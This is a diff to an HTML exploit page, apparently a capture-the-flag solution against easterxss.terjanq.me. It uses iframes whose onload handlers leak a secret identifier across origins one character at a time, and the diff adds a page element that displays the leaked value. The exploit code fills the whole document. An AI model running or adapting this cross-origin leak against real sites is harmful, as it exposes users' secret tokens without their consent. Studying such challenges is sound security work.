@@ -1,3 +1,13 @@
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="cache-control" content="no-store">
+    <style>iframe{width: 30px;height: 30px;}span {display: block;}</style>
+</head>
+
+<body>
+    <span>Leaked identifier: <code id=leakedIdentifier></code></span>
 <iframe name=i_true 
         src=//easterxss.terjanq.me/style.css
         onload=process(this,true)
@@ -28,6 +38,11 @@
       location = top_url + '#0';
   }
 
+  function log(identifier){
+      leakedIdentifier.innerHTML = identifier;
+      console.log(identifier);
+  }
+
   function process(ifr, value){
     // Skip first onload
     if(!ifr.loaded) {
@@ -39,7 +54,7 @@
         // If cur_char is 0, it means that the strings are equal.
         if(cur_char === 0) return solve(cur_identifier);
         cur_identifier += alph[cur_char-1];
-        console.log(cur_identifier)
+        log(cur_identifier)
         // store new identifier in sessionStorage and reset cur_char
         cur_char = 0;
         sessionStorage.setItem('identifier', cur_identifier)
@@ -69,3 +84,4 @@
     }
   
 </script>
+</body></html>
